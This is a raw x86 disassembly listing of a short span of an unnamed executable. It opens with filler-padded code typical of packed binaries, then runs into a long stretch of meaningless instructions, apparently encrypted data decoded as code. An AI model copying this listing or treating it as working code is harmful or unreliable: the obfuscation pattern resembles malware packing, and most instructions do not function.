  4027d3:	xor    ecx,ebx
  4027d5:	add    ecx,eax
  4027d7:	mov    DWORD PTR ds:0x422008,0x50f1
  4027e1:	cmp    esi,ecx
  4027e3:	jne    0x404d01
  4027e9:	add    DWORD PTR ds:0x420f9c,0x56b8
  4027f3:	push   DWORD PTR [ebp+0x8]
  4027f6:	call   0x40233b
  4027fb:	mov    DWORD PTR [ebp-0x18],eax
  4027fe:	mov    eax,DWORD PTR [ebp-0x4]
  402801:	xor    edi,edi
  402803:	xor    edi,DWORD PTR ds:0x420eb6
  402809:	xor    ecx,ecx
  40280b:	add    ecx,DWORD PTR ds:0x423014
  402811:	sub    edi,ecx
  402813:	or     edi,DWORD PTR [edi+ecx*1]
  402816:	mov    ecx,DWORD PTR [ebp-0x18]
  402819:	add    edi,DWORD PTR ds:0x420e9a
  40281f:	xor    eax,ebx
  402821:	mov    edi,0x3272dd
  402826:	add    eax,edi
  402828:	mov    DWORD PTR ds:0x422004,0x6f95
  402832:	cmp    ecx,eax
  402834:	mov    DWORD PTR ds:0x420e96,0x4ad4
  40283e:	je     0x404e26
  402844:	add    DWORD PTR ds:0x420e8a,0x2aaf
  40284e:	push   DWORD PTR [ebp-0x18]
  402851:	push   DWORD PTR [ebp+0x8]
  402854:	neg    DWORD PTR ds:0x420f70
  40285a:	call   0x410a1b
  40285f:	and    DWORD PTR ds:0x420eec,0x0
  402869:	mov    ecx,DWORD PTR ds:0x420eec
  40286f:	inc    ecx
  402870:	mov    DWORD PTR ds:0x420eec,ecx
  402876:	cmp    DWORD PTR ds:0x420eec,0x7
  40287d:	jne    0x402893
  402883:	push   0x4240e4
  402888:	push   0x424143
  40288d:	call   DWORD PTR ds:0x4247dd
  402893:	cmp    DWORD PTR ds:0x420eec,0x6
  40289a:	jne    0x4028ad
  4028a0:	mov    ecx,DWORD PTR ds:0x420eec
  4028a6:	inc    ecx
  4028a7:	mov    DWORD PTR ds:0x420eec,ecx
  4028ad:	cmp    DWORD PTR ds:0x420eec,0x11
  4028b4:	jb     0x402869
  4028ba:	xor    DWORD PTR ds:0x420f00,edx
  4028c0:	mov    DWORD PTR [ebp-0x18],eax
  4028c3:	adc    ecx,DWORD PTR ds:0x420ef8
  4028c9:	jmp    0x404c56
  4028ce:	rcr    DWORD PTR [ecx-0x1e],cl
  4028d1:	mov    fs,esp
  4028d3:	jno    0x402950
  4028d5:	sti    
  4028d6:	inc    esi
  4028d7:	scas   eax,DWORD PTR es:[edi]
  4028d8:	dec    ebx
  4028d9:	imul   ecx,ecx,0x7ac1255b
  4028df:	jp     0x40295b
  4028e1:	jp     0x4028ed
  4028e3:	pop    edi
  4028e4:	jp     0x402960
  4028e6:	adc    eax,0x1921172c
  4028eb:	and    eax,0x34652f1b
  4028f0:	imul   esp,DWORD PTR [esi+0x57],0x6d6a6a61
  4028f7:	xor    al,ch
  4028f9:	fsubr  st(1),st
  4028fb:	push   eax
  4028fc:	dec    eax
  4028fd:	imul   esp,DWORD PTR [ecx+0x5b],0xffffff90
  402901:	pusha  
  402902:	ins    DWORD PTR es:[edi],dx
  402903:	pop    ecx
  402904:	iret   
  402905:	pop    ebp
  402906:	dec    edx
  402907:	and    BYTE PTR [edx+edi*8+0x4d577687],cl
  40290e:	jg     0x402947
  402910:	jo     0x4028b8
  402912:	jg     0x4028b4
  402914:	mov    ds:0x66ff2c3b,al
  402919:	fdiv   st(2),st
  40291b:	push   ebx
  40291c:	jg     0x40293c
  40291e:	in     eax,dx
  40291f:	cmp    ebp,ecx
  402921:	mov    edx,0xde1387ed
  402926:	mov    ebp,DWORD PTR [ecx]
  402928:	mulps  xmm5,XMMWORD PTR [ebx+0x6df7c48a]
  40292f:	fld    QWORD PTR [esp+edx*8]
  402932:	push   cs
  402933:	cli    
  402934:	sbb    BYTE PTR es:[eax+0xc],cl
  402938:	imul   ebp,DWORD PTR es:[eax-0x47],0xffffffaf
  40293d:	adc    eax,DWORD PTR [ecx+0x5]
  402940:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402941:	(bad)  
  402942:	jmp    0x32b45490
  402947:	enter  0xf95b,0x1a
  40294b:	cli    
  40294c:	js     0x4028ef
  40294e:	arpl   bp,bx
  402950:	cwde   
  402951:	pop    edi
  402952:	mov    esp,DWORD PTR [ecx+0x31821407]
  402958:	repz sahf 
  40295a:	cmp    al,0x72
  40295c:	jae    0x402969
  40295e:	fisubr DWORD PTR ds:0x33348d52
  402964:	push   esp
  402965:	jecxz  0x402936
  402967:	mov    ch,BYTE PTR [ecx]
  402969:	mov    DWORD PTR [eax+0x5188ccb7],esi
  40296f:	in     al,0x45
  402971:	push   edx
  402972:	dec    esp
  402973:	or     al,0x3e
  402975:	repz add ebp,DWORD PTR ss:[ebp+0x30a7ca4b]
  40297d:	rol    BYTE PTR [esi+edx*2],0xfd
  402981:	push   edx
  402982:	push   esi
  402983:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402984:	stc    
  402985:	push   0x1642f8bf
  40298a:	fucom  st(6)
  40298c:	les    eax,FWORD PTR [edi]
  40298e:	je     0x4029fd
  402990:	lahf   
  402991:	xchg   esp,eax
  402992:	push   0xaa17f39b
  402997:	mov    ebp,0x8f3eb779
  40299c:	loopne 0x402989
  40299e:	mov    edx,0xbb65d217
  4029a3:	mov    bl,0xb5
  4029a5:	cli    
  4029a6:	jo     0x40293f
  4029a8:	jmp    0x45c1695d
  4029ad:	dec    eax
  4029ae:	stos   DWORD PTR es:[edi],eax
  4029af:	stos   DWORD PTR es:[edi],eax
  4029b0:	mov    esp,DWORD PTR [eax-0xdc5986a]
  4029b6:	imul   ebp,DWORD PTR [ebx+eiz*4+0x18],0x986c8ef8
  4029be:	enter  0x580,0xc4
  4029c2:	jp     0x402a15
  4029c4:	outs   dx,BYTE PTR ds:[esi]
  4029c5:	ror    al,0xf5
  4029c8:	sub    al,0xc2
  4029ca:	sbb    al,0xe0
  4029cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4029cd:	xchg   edi,eax
  4029ce:	dec    ebx
  4029cf:	cdq    
  4029d0:	pop    ss
  4029d1:	rcl    BYTE PTR [ecx],cl
  4029d3:	push   0x9e135abc
  4029d8:	cmp    eax,0xa9fd642b
  4029dd:	stc    
  4029de:	dec    ecx
  4029df:	lock push esi
  4029e1:	xor    ebp,eax
  4029e3:	les    edx,FWORD PTR [edx+0x439d5080]
  4029e9:	pop    edx
  4029ea:	int    0x71
  4029ec:	mov    cl,0xa7
  4029ee:	sub    ebp,DWORD PTR [esp+edx*2+0x3e]
  4029f2:	pop    ebp
  4029f3:	std    
  4029f4:	mov    edi,0xed13e347
  4029f9:	aam    0x43
  4029fb:	rcl    DWORD PTR [ecx-0x4bb6e116],cl
  402a01:	ret    0x58ab
  402a04:	loop   0x4029ee
  402a06:	pop    esp
  402a07:	cmp    eax,ecx
  402a09:	push   edi
  402a0a:	dec    ecx
  402a0b:	dec    ecx
  402a0c:	lods   eax,DWORD PTR ds:[esi]
  402a0d:	sbb    ecx,edi
  402a0f:	das    
  402a10:	xor    esi,DWORD PTR [esi+esi*2-0x3dd9f829]
  402a17:	xor    esp,DWORD PTR [edi]
  402a19:	jg     0x4029e4
  402a1b:	pushf  
  402a1c:	in     al,dx
  402a1d:	test   ebp,ebp
  402a1f:	mov    ds:0x4e1eeb6e,al
  402a24:	(bad)  
  402a25:	xchg   ebx,eax
  402a26:	in     al,0x22
  402a28:	adc    BYTE PTR [edi-0x64b29d44],0xfc
  402a2f:	sub    eax,0x4e3e1066
  402a34:	sub    al,0x68
  402a36:	adc    dl,BYTE PTR [eax+0x26fb352b]
  402a3c:	popf   
  402a3d:	sbb    eax,0x7d7acdbb
  402a42:	sub    DWORD PTR gs:[ebx-0x5e13537e],0x24
  402a4a:	mov    ah,0x67
  402a4c:	or     dh,BYTE PTR [ebp-0xb95b32b]
  402a52:	xchg   ebx,eax
  402a53:	pop    edi
  402a54:	mov    edi,0xed80d700
  402a59:	sbb    DWORD PTR [eax+eax*4],eax
  402a5c:	cli    
  402a5d:	outs   dx,DWORD PTR ds:[esi]
  402a5e:	mov    ecx,0x44e832c9
  402a63:	mov    eax,ds:0xc03f5896
  402a68:	fistp  WORD PTR [ebp+0x5e]
  402a6b:	adc    BYTE PTR [ebp-0x5f],al
  402a6e:	in     al,dx
  402a6f:	out    dx,eax
  402a70:	aad    0x44
  402a72:	mov    eax,ds:0x78b24fb9
  402a77:	mov    al,ds:0xe320c561
  402a7c:	push   edx
  402a7d:	sub    DWORD PTR [esi+esi*2+0x26],edx
  402a81:	inc    esi
  402a82:	inc    esi
  402a83:	ins    BYTE PTR es:[edi],dx
  402a84:	adc    eax,0x94b1403a
  402a89:	add    bl,BYTE PTR [ecx+0xafa1fac]
  402a8f:	sub    BYTE PTR [esi],0x1
  402a92:	iret   
  402a93:	and    eax,0xa11387
  402a98:	sti    
  402a99:	lea    edx,[edi-0x63]
  402a9c:	int3   
  402a9d:	push   0xffffffde
  402a9f:	jae    0x402ae5
  402aa1:	jl     0x402a74
  402aa3:	adc    bh,BYTE PTR [eax-0x77]
  402aa6:	dec    ebp
  402aa7:	and    cl,BYTE PTR [edx]
  402aa9:	and    al,0x52
  402aab:	popa   
  402aac:	dec    esi
  402aad:	cmc    
  402aae:	push   ss
  402aaf:	xor    eax,esi
  402ab1:	clc    
  402ab2:	jnp    0x402aa2
  402ab4:	push   ebx
  402ab5:	scas   eax,DWORD PTR es:[edi]
  402ab6:	jmp    0x2853c0ea
  402abb:	out    dx,eax
  402abc:	shl    DWORD PTR [ebp+0x9],0x72
  402ac0:	jae    0x402b05
  402ac2:	std    
  402ac3:	push   esi
  402ac4:	mov    cl,0xee
  402ac6:	push   ss
  402ac7:	pop    ss
  402ac8:	cmp    edi,DWORD PTR [edx-0x3c18a786]
  402ace:	lea    ebp,[edx+0x35]
  402ad1:	cld    
  402ad2:	int3   
  402ad3:	inc    edi
  402ad4:	jne    0x402aa1
  402ad6:	or     al,0x92
  402ad8:	fwait
  402ad9:	jg     0x402b22
  402adb:	mov    DWORD PTR [ebp-0x80],ecx
  402ade:	fiadd  WORD PTR [esi+0x5d394956]
  402ae4:	inc    edx
  402ae5:	das    
  402ae6:	std    
  402ae7:	fwait
  402ae8:	clc    
  402ae9:	cmp    BYTE PTR [ebx],ch
  402aeb:	sub    edi,esp
  402aed:	stos   BYTE PTR es:[edi],al
  402aee:	push   eax
  402aef:	adc    edi,esp
  402af1:	imul   ecx,DWORD PTR [edx-0x7cf20101],0xb34256c5
  402afb:	dec    esp
  402afd:	adc    ch,BYTE PTR [esi+0x3a]
  402b00:	bound  eax,QWORD PTR [esi+0x66]
  402b03:	jmp    0x402b64
  402b05:	fsubr  DWORD PTR [ebp-0x1b]
  402b08:	mov    ch,0xd5
  402b0a:	inc    ebp
  402b0b:	ins    DWORD PTR es:[edi],dx
  402b0c:	pop    ebx
  402b0d:	inc    ecx
  402b0e:	push   cs
  402b0f:	inc    ebp
  402b10:	cwde   
  402b11:	ins    BYTE PTR es:[edi],dx
  402b12:	sti    
  402b13:	cmp    al,0x76
  402b15:	push   0x72
  402b17:	es push esp
  402b19:	in     eax,0xc9
  402b1b:	jo     0x402b1d
  402b1d:	sbb    al,0xd3
  402b1f:	jmp    0x402aa5
  402b21:	jns    0x402b1b
  402b23:	loopne 0x402af8
  402b25:	jmp    0x5b44:0x4c6b67c3
  402b2c:	xor    al,0x6b
  402b2f:	bsf    esi,eax
  402b32:	jb     0x402ac6
  402b34:	cdq    
  402b35:	test   ebx,0x768ae3a7
  402b3b:	icebp  
  402b3c:	jl     0x402b39
  402b3e:	popf   
  402b3f:	sbb    cl,bl
  402b41:	dec    esp
  402b42:	cdq    
  402b43:	(bad)  
  402b44:	sahf   
  402b45:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402b46:	sub    DWORD PTR [edx+0x47c852bc],esp
  402b4c:	xchg   ecx,eax
  402b4d:	inc    cx
  402b4f:	out    0xd7,eax
  402b51:	and    al,0x82
  402b53:	mov    esp,0xac2b035b
  402b58:	or     eax,0xba985926
  402b5d:	iret   
  402b5e:	test   DWORD PTR [eax+0x56ce1bd2],esi
  402b64:	add    BYTE PTR [esi+0x31],bh
  402b67:	(bad)  
  402b68:	mov    DWORD PTR [edx+0x6b75f968],edi
  402b6e:	mov    ss,WORD PTR [edx-0x11]
  402b71:	cmp    ebp,DWORD PTR [esi+0x2f]
  402b74:	fstp   TBYTE PTR [edi]
  402b76:	in     eax,dx
  402b77:	icebp  
  402b78:	pop    eax
  402b79:	test   DWORD PTR [ebx+0x58],esp
  402b7c:	mov    al,ds:0xfaefce50
  402b81:	in     al,dx
  402b82:	loop   0x402b22
  402b84:	jmp    0x402b07
  402b86:	mov    ecx,DWORD PTR [edx-0x65beb6e7]
  402b8c:	mov    DWORD PTR [edi+ebp*8],esi
  402b8f:	mov    eax,0xe4559ecd
  402b94:	aaa    
  402b95:	ficomp DWORD PTR [ebx-0xa2aed9c]
  402b9b:	pop    esp
  402b9c:	in     al,dx
  402b9d:	pop    edx
  402b9e:	jle    0x402ba3
  402ba0:	push   ds
  402ba1:	rcl    esi,0x98
  402ba4:	(bad)  
  402ba5:	out    dx,al
  402ba6:	(bad)  
  402ba7:	push   esp
  402ba8:	adc    eax,0x72605f65
  402bad:	adc    eax,0xd7234ba3
  402bb2:	push   0x6d3dac09
  402bb7:	outs   dx,DWORD PTR ds:[esi]
  402bb8:	out    0x24,al
  402bba:	inc    ebx
  402bbb:	jp     0x402bdf
  402bbd:	out    dx,al
  402bbe:	inc    esp
  402bbf:	leave  
  402bc0:	adc    ah,BYTE PTR [ecx-0x55]
  402bc3:	sar    BYTE PTR ds:0x661ef5a0,1
  402bc9:	clc    
  402bca:	mov    bl,0x15
  402bcc:	packsswb mm1,QWORD PTR [esi+0x20]
  402bd0:	cmp    dl,BYTE PTR [ecx-0x5779c6ba]
  402bd6:	xchg   al,ch
  402bd8:	sub    ebp,DWORD PTR [edx*2+0x10567a6]
  402bdf:	jmp    0x402c0a
  402be1:	and    cl,BYTE PTR [edx-0x27b27f8b]
  402be7:	jae    0x402bf5
  402be9:	(bad)  
  402bea:	out    dx,al
  402beb:	pop    eax
  402bec:	scas   al,BYTE PTR es:[edi]
  402bed:	jl     0x402c2b
  402bef:	ins    BYTE PTR es:[edi],dx
  402bf0:	jmp    0xd9051570
  402bf5:	sti    
  402bf6:	dec    edx
  402bf7:	xchg   edx,eax
  402bf8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402bf9:	or     dl,BYTE PTR [edx-0x42]
  402bfc:	les    eax,FWORD PTR [eax]
  402bfe:	ret    0xc65c
  402c01:	(bad)  
  402c02:	pop    edx
  402c03:	jb     0x402ba8
  402c05:	(bad)  
  402c07:	ficomp WORD PTR [edi-0x3a40a1ed]
  402c0d:	and    cl,BYTE PTR [edi-0x79e643e2]
  402c13:	sbb    al,0x4c
  402c15:	mov    ds:0x964c880b,eax
  402c1a:	shr    ah,0xfd
  402c1d:	fdiv   DWORD PTR [ebx-0x20]
  402c20:	sub    al,0xd5
  402c22:	and    BYTE PTR [esi+0x34062237],ch
  402c28:	test   BYTE PTR [eax-0x5f],al
  402c2b:	or     al,0x3c
  402c2d:	int    0xef
  402c2f:	repnz push ecx
  402c31:	mov    edx,0xab5cbf58
  402c36:	lods   eax,DWORD PTR ds:[esi]
  402c37:	mov    ah,0x96
  402c39:	clc    
  402c3a:	outs   dx,DWORD PTR ds:[esi]
  402c3b:	lock push ss
  402c3d:	(bad)  
  402c3e:	xchg   ebx,eax
  402c3f:	stos   DWORD PTR es:[edi],eax
  402c40:	fdiv   st(3),st
  402c42:	push   ebp
  402c43:	mov    eax,0xf76577d9
  402c48:	add    eax,0xa6252c91
  402c4d:	cmp    esp,DWORD PTR [ebx-0x2]
  402c50:	mov    esi,0xd67bf9fd
  402c55:	mov    ds:0x1989b174,eax
  402c5a:	inc    esi
  402c5b:	fucomi st,st(2)
  402c5d:	adc    eax,0x5d18336b
  402c62:	fcomp  DWORD PTR [edx+0x1d7a564d]
  402c68:	ret    
  402c69:	jp     0x402c25
  402c6b:	push   ebx
  402c6c:	out    dx,eax
  402c6d:	(bad)  
  402c6e:	aad    0x93
  402c70:	or     al,0x47
  402c72:	int    0xe0
  402c74:	gs ja  0x402cd8
  402c77:	shl    DWORD PTR [eax-0x12a30ac9],cl
  402c7d:	xor    ebp,DWORD PTR [edx+eiz*1-0x59f25c73]
  402c84:	xchg   esp,eax
  402c85:	cmc    
  402c86:	shl    bh,0xef
  402c89:	ins    BYTE PTR es:[edi],dx
  402c8a:	inc    ecx
  402c8b:	and    DWORD PTR [ebx],ebx
  402c8d:	inc    ecx
  402c8e:	mov    cl,0x93
  402c90:	cs enter 0x7f51,0xdc
  402c95:	mov    ch,0x22
  402c97:	push   es
  402c98:	test   al,0xe1
  402c9a:	popa   
  402c9b:	or     BYTE PTR [ecx-0x7990a43f],bl
  402ca1:	aad    0xee
  402ca3:	inc    ebp
  402ca4:	ins    DWORD PTR es:[edi],dx
  402ca5:	jo     0x402c39
  402ca7:	sbb    DWORD PTR [eax-0x6f2381e8],0x4a8e0c8b
  402cb1:	xchg   ecx,eax
  402cb2:	cmc    
  402cb3:	sbb    ch,cl
  402cb5:	adc    esi,DWORD PTR [edx+0x62e0098b]
  402cbb:	lahf   
  402cbc:	sub    DWORD PTR es:[ebx-0x4aa6cd78],edx
  402cc3:	cmp    al,0x90
  402cc5:	out    dx,al
  402cc6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402cc7:	push   ebx
  402cc8:	adc    bh,BYTE PTR [ecx-0x5a2c5105]
  402cce:	(bad)  
  402cd0:	fucomip st,st(5)
  402cd2:	jl     0x402c7a
  402cd4:	lea    esi,[edi]
  402cd6:	outs   dx,DWORD PTR ds:[esi]
  402cd7:	in     al,dx
  402cd8:	scas   eax,DWORD PTR es:[edi]
  402cd9:	nop    DWORD PTR [esi-0x22a142c8]
  402ce0:	outs   dx,DWORD PTR ds:[esi]
  402ce1:	jbe    0x402cf3
  402ce3:	fcomp  QWORD PTR [eax+ebp*2-0x70]
  402ce7:	xchg   ebp,eax
  402ce8:	sub    DWORD PTR [ecx-0x57],edi
  402ceb:	mov    esp,0xcff7c515
  402cf0:	mov    eax,ds:0xbecf83dd
  402cf5:	dec    ecx
  402cf6:	jmp    0xb1b3ddca
  402cfb:	push   edi
  402cfc:	inc    edi
  402cfd:	enter  0x3857,0x16
  402d01:	and    eax,DWORD PTR [edx+0x76]
  402d04:	mov    bl,0x32
  402d06:	or     al,BYTE PTR [eax-0x43]
  402d09:	sub    BYTE PTR [edx+0x7e],ah
  402d0c:	inc    edx
  402d0d:	xor    DWORD PTR [eax],eax
  402d0f:	cmp    esi,edx
  402d11:	xchg   esp,eax
  402d12:	mov    dh,0x28
  402d14:	xor    BYTE PTR [edi],0x85
  402d17:	jmp    0x8ace:0xe8126c8a
  402d1e:	jbe    0x402d6f
  402d20:	xchg   esi,eax
  402d21:	into   
  402d22:	mov    eax,0x4a65023e
  402d27:	adc    cl,al
  402d29:	lods   al,BYTE PTR ds:[esi]
  402d2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402d2b:	push   ss
  402d2c:	mov    eax,ds:0xebad9ea0
  402d31:	and    eax,0xdf1c28ea
  402d36:	out    0xe,eax
  402d38:	push   esi
  402d39:	jbe    0x402d46
  402d3b:	pop    ss
  402d3c:	cmp    DWORD PTR [ebx+0x5d],ebp
  402d3f:	in     eax,0xea
  402d41:	(bad)  
  402d42:	das    
  402d43:	mov    dh,0x2c
  402d45:	rol    edx,cl
  402d47:	xchg   edi,eax
  402d48:	or     DWORD PTR [edx+0x4f],edi
  402d4b:	or     bh,BYTE PTR [ecx]
  402d4d:	cli    
  402d4e:	mov    eax,ds:0x85c8fa1f
  402d53:	inc    edi
  402d54:	cld    
  402d55:	or     bl,BYTE PTR ds:0x7372900f
  402d5b:	xlat   BYTE PTR ds:[ebx]
  402d5c:	(bad)  
  402d5e:	adc    eax,0x54765005
  402d63:	retf   0xbd2a
  402d66:	or     al,0xba
  402d68:	add    al,0x41
  402d6a:	xchg   edx,eax
  402d6b:	or     edi,DWORD PTR [edi]
  402d6d:	mov    dh,0xbe
  402d6f:	push   es
  402d70:	mov    dh,ah
  402d72:	push   ecx
  402d73:	mov    esi,0xace66ed2
  402d78:	add    BYTE PTR [eax],bh
  402d7a:	pop    esi
  402d7b:	inc    ecx
  402d7c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402d7d:	mov    edi,0x608abf60
  402d82:	inc    ecx
  402d83:	pop    edi
  402d84:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402d85:	mov    ebx,0x5dfd978
  402d8a:	pop    ss
  402d8b:	mov    al,ds:0xdd929ee
  402d90:	pushf  
  402d91:	daa    
  402d92:	lods   eax,DWORD PTR ds:[esi]
  402d93:	and    DWORD PTR [ebx-0x6bea4b65],esi
  402d99:	mov    BYTE PTR [edi],bh
  402d9b:	or     eax,0xdf08f2df
  402da0:	das    
  402da1:	jg     0x402d4d
  402da3:	push   0xce25d507
  402da8:	clc    
  402da9:	fist   WORD PTR [eax]
  402dab:	fist   DWORD PTR [ebp+esi*2+0x46]
  402daf:	mov    al,ds:0xf4d97a8a
  402db4:	fsub   DWORD PTR [edi]
  402db6:	push   esp
  402db7:	sbb    al,bh
  402db9:	xor    eax,0x383a548e
  402dbe:	and    BYTE PTR [ebp+0x1c],dl
  402dc1:	jne    0x402d9f
  402dc3:	jb     0x402df8
  402dc5:	jne    0x402db2
  402dc7:	loopne 0x402dc3
  402dc9:	xchg   bl,ch
  402dcb:	push   0xacfb6459
  402dd0:	lods   al,BYTE PTR ds:[esi]
  402dd1:	into   
  402dd2:	pop    ss
  402dd3:	inc    esp
  402dd4:	jp     0x402de6
  402dd6:	loop   0x402da6
  402dd8:	xchg   ecx,eax
  402dd9:	xchg   ebx,eax
  402dda:	fs sahf 
  402ddc:	or     DWORD PTR [ebx-0x7f05bd69],ecx
  402de2:	xchg   edx,eax
  402de3:	shl    dh,0xc6
  402de6:	xchg   esp,eax
  402de7:	cmc    
  402de8:	add    ebx,DWORD PTR [edi+0x51]
  402deb:	test   eax,0x2a818e52
  402df0:	mov    bh,0x7f
  402df2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402df3:	fild   DWORD PTR [ebp-0x7f]
  402df6:	ja     0x402dd8
  402df8:	retf   0x3ab8
  402dfb:	mov    dl,0x1
  402dfd:	push   esp
  402dfe:	std    
  402dff:	dec    esi
  402e00:	dec    ebp
  402e01:	mov    BYTE PTR [edi+0x6e2cce7c],ah
  402e07:	call   0x27f5:0xbcef0f9e
  402e0e:	cdq    
  402e0f:	out    0x75,al
  402e11:	adc    cl,bl
  402e13:	xchg   ecx,eax
  402e14:	or     ah,BYTE PTR [eax-0x4f]
  402e17:	(bad)  
  402e18:	jge    0x402e17
  402e1a:	mov    ebp,0x3e6f7428
  402e1f:	and    al,0x7e
  402e21:	sbb    esi,DWORD PTR [esi+0x340884a]
  402e27:	cld    
  402e28:	xchg   BYTE PTR [ecx+eiz*1+0x7a],dl
  402e2c:	pop    ecx
  402e2d:	jecxz  0x402ded
  402e2f:	iret   
  402e30:	mov    cl,0x1b
  402e32:	jecxz  0x402e19
  402e34:	retf   
  402e35:	in     al,0xbd
  402e37:	(bad)
  402e3a:	mov    al,0xf8
  402e3c:	clc    
  402e3d:	dec    edi
  402e3e:	xchg   DWORD PTR [edx],edx
  402e40:	xor    cl,BYTE PTR [edi-0xe87ea4a]
  402e46:	loopne 0x402e97
  402e48:	cdq    
  402e49:	out    dx,al
  402e4a:	push   ds
  402e4b:	dec    ebp
  402e4c:	jne    0x402de2
  402e4e:	pop    es
  402e4f:	hlt    
  402e50:	adc    al,dh
  402e52:	and    BYTE PTR [edx+ebp*1],al
  402e55:	add    eax,DWORD PTR [edi]
  402e57:	add    eax,esp
  402e59:	popa   
  402e5a:	gs mov bl,0x7f
  402e5d:	mov    eax,0x6040ad6f
  402e62:	adc    DWORD PTR [ebp+0x271e7835],0x71
  402e69:	(bad)
  402e6c:	in     al,0x3d
  402e6e:	das    
  402e6f:	push   eax
  402e70:	dec    ecx
  402e71:	ins    DWORD PTR es:[edi],dx
  402e72:	mov    eax,ds:0x8314c9fc
  402e77:	fnstsw ax
  402e79:	call   0xa52b:0x2d391f04
  402e80:	inc    eax
  402e81:	imul   esi,ecx,0xad57601d
  402e87:	das    
  402e88:	int3   
  402e89:	pop    di
  402e8b:	xchg   ecx,eax
  402e8c:	cmp    esp,edx
  402e8e:	aad    0xdd
  402e90:	pop    ss
  402e91:	mov    ds:0xa059a7b3,eax
  402e96:	xchg   edx,eax
  402e97:	sbb    dh,ah
  402e99:	or     bl,BYTE PTR [ecx]
  402e9b:	ficom  DWORD PTR [ebp-0x75]
  402e9e:	jge    0x402ec4
  402ea0:	cmp    esp,esp
  402ea2:	push   edx
  402ea3:	pop    esi
  402ea4:	js     0x402eb6
  402ea6:	fst    QWORD PTR [edi+0x1e0cc19]
  402eac:	jns    0x402e40
  402eae:	sahf   
  402eaf:	dec    edx
  402eb0:	add    ecx,DWORD PTR [edi-0x2adeeed]
  402eb6:	and    BYTE PTR [ebx-0x781b6aeb],0xe3
  402ebd:	cmp    edi,DWORD PTR [esi-0x567680a4]
  402ec3:	stos   DWORD PTR es:[edi],eax
  402ec4:	jp     0x402e92
  402ec6:	hlt    
  402ec7:	xor    eax,0x2843ce92
  402ecc:	dec    ebp
  402ecd:	mov    edx,0x53b7ddca
  402ed2:	xchg   edi,eax
  402ed3:	out    0x49,eax
  402ed5:	ret    
  402ed6:	sub    BYTE PTR [ecx*1+0x71ef9bf9],cl
  402edd:	push   esi
  402ede:	out    0x25,eax
  402ee0:	jns    0x402f13
  402ee2:	lods   eax,DWORD PTR ds:[esi]
  402ee3:	sahf   
  402ee4:	(bad)  
  402ee5:	daa    
  402ee6:	aas    
  402ee7:	add    BYTE PTR [ebx],al
  402ee9:	addr16 xor al,0x27
  402eec:	pop    ecx
  402eed:	call   0x1dc7b74c
  402ef2:	cmp    BYTE PTR [edx-0x1cd8ea5d],0xb
  402ef9:	outs   dx,BYTE PTR ds:[esi]
  402efa:	pop    ecx
  402efb:	sbb    al,0xab
  402efd:	jl     0x402f6e
  402eff:	push   ebp
  402f00:	aas    
  402f01:	sbb    DWORD PTR [edi-0x1e],ebx
  402f04:	jns    0x402eef
  402f06:	call   0x4fc8:0x95c3e826
  402f0d:	mov    ebp,0x402be226
  402f12:	dec    ebp
  402f13:	push   edx
  402f14:	cld    
  402f15:	ins    BYTE PTR es:[edi],dx
  402f16:	(bad)  
  402f17:	pop    ecx
  402f18:	sub    al,0x91
  402f1a:	pop    edx
  402f1b:	push   eax
  402f1c:	leave  
  402f1d:	in     al,0xaf
  402f1f:	jae    0x402f4a
  402f21:	jp     0x402f06
  402f23:	sub    al,BYTE PTR [esi*1-0xa12e06b]
  402f2a:	xchg   ebp,eax
  402f2b:	dec    ebp
  402f2c:	imul   ebp,esi,0x72f4719e
  402f32:	xor    bh,BYTE PTR [edx+ebx*2]
  402f35:	inc    edi
  402f36:	leave  
  402f37:	je     0x402ef5
  402f39:	sbb    BYTE PTR [ebx+ecx*1+0x2087b4a5],dh
  402f40:	push   esp
  402f41:	mov    eax,ds:0x5718e92f
  402f46:	inc    edi
  402f47:	cmp    eax,0x809abe79
  402f4c:	push   0x2a
  402f4e:	mov    ds:0x71fd2ba4,al
  402f53:	mov    ebx,0x3a1bfd89
  402f58:	xchg   edx,eax
  402f59:	lods   eax,DWORD PTR ds:[esi]
  402f5a:	imul   ebp,DWORD PTR [edi+0x2ce144c2],0xffffffa0
  402f61:	sti    
  402f62:	in     al,0x89
  402f64:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402f65:	jp     0x402f8b
  402f67:	(bad)  
  402f68:	js     0x402f6d
  402f6a:	std    
  402f6b:	shr    BYTE PTR [ebx+0x4dc48e3],1
  402f71:	push   esi
  402f72:	stos   BYTE PTR es:[edi],al
  402f73:	neg    DWORD PTR [ecx-0x32]
  402f76:	dec    edi
  402f77:	cwde   
  402f78:	pop    es
  402f79:	outs   dx,DWORD PTR ds:[esi]
  402f7a:	mov    eax,0x930df7a1
  402f7f:	xor    DWORD PTR [edx],0xffffffc7
  402f82:	inc    esi
  402f83:	in     eax,dx
  402f84:	(bad)  
  402f85:	stc    
  402f86:	stos   BYTE PTR es:[edi],al
  402f87:	pop    ecx
  402f88:	dec    edi
  402f89:	jne    0x402f1f
  402f8b:	clc    
  402f8c:	jnp    0x40300a
  402f8e:	pop    ebx
  402f8f:	sbb    eax,0xc9008695
  402f94:	cli    
  402f95:	jecxz  0x402fc4
  402f97:	daa    
  402f98:	dec    edx
  402f99:	stc    
  402f9a:	add    ch,BYTE PTR [ebx+eax*2+0x15bfe35a]
  402fa1:	jbe    0x402f65
  402fa3:	in     eax,dx
  402fa4:	jo     0x402ff7
  402fa6:	pop    edx
  402fa7:	enter  0x89ac,0xb9
  402fab:	inc    esp
  402fac:	stos   BYTE PTR es:[edi],al
  402fad:	popa   
  402fae:	call   0x2df6:0x6b284cf1
  402fb5:	mov    eax,ds:0x67e1d257
  402fba:	jecxz  0x403020
  402fbc:	fmulp  st(1),st
  402fbe:	ret    
  402fbf:	and    BYTE PTR [ebx-0x73d48ea1],ah
  402fc5:	ficom  WORD PTR [eax]
  402fc7:	inc    esp
  402fc8:	and    BYTE PTR [esp+eax*2+0x2fea484f],0x15
  402fd0:	(bad)  
  402fd1:	frstor [ebx+0x3b]
  402fd4:	push   edx
